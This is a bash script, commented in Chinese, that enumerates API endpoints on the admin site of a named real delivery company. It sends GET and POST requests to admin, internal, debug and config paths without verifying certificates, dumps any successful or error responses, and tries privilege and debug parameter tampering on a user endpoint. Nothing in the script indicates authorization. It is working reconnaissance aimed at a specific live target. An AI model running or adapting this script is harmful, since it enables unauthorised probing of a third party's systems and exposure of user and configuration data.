#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 深度API枚举 - 测试所有可能的参数组合"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

BASE_URL="https://admin.giaohangtietkiem.vn"

echo "[*] 测试常见API路径..."
API_PATHS=(
    "/api/v1/user"
    "/api/v1/users"
    "/api/v1/user/me"
    "/api/v1/profile"
    "/api/v1/admin/users"
    "/api/v1/config"
    "/api/v1/settings"
    "/api/v1/debug"
    "/api/v1/test"
    "/api/v1/health"
    "/api/v1/status"
    "/api/v2/user"
    "/api/internal/user"
    "/api/admin/user"
    "/.well-known/config"
)

for api in "${API_PATHS[@]}"; do
    for method in GET POST; do
        echo -n "  $method $api → "
        if [ "$method" == "GET" ]; then
            resp=$(curl -sk "$BASE_URL$api" -w "%{http_code}" -o /tmp/api_resp -m 2 2>/dev/null)
        else
            resp=$(curl -sk "$BASE_URL$api" -X POST -d '{}' -H "Content-Type: application/json" -w "%{http_code}" -o /tmp/api_resp -m 2 2>/dev/null)
        fi
        
        if [ "$resp" == "200" ]; then
            echo "✅ 200"
            cat /tmp/api_resp | jq . 2>/dev/null || cat /tmp/api_resp | head -10
            echo "━━━"
        elif [ "$resp" == "500" ]; then
            echo "🔥 500 (错误！)"
            cat /tmp/api_resp | head -10
            echo "━━━"
        elif [ "$resp" == "401" ]; then
            echo "⚠️  401 (API存在，需认证)"
        else
            echo "❌ $resp"
        fi
    done
done

echo ""
echo "[*] 测试参数注入..."
PARAMS=(
    "?debug=true"
    "?test=1"
    "?admin=1"
    "?id=1"
    "?user_id=1"
    "?limit=999999"
)

for param in "${PARAMS[@]}"; do
    echo -n "  /api/v1/user$param → "
    resp=$(curl -sk "$BASE_URL/api/v1/user$param" -w "%{http_code}" -o /tmp/param_test -m 2 2>/dev/null)
    if [ "$resp" == "200" ]; then
        echo "✅ 200"
        cat /tmp/param_test | head -10
    else
        echo "❌ $resp"
    fi
done

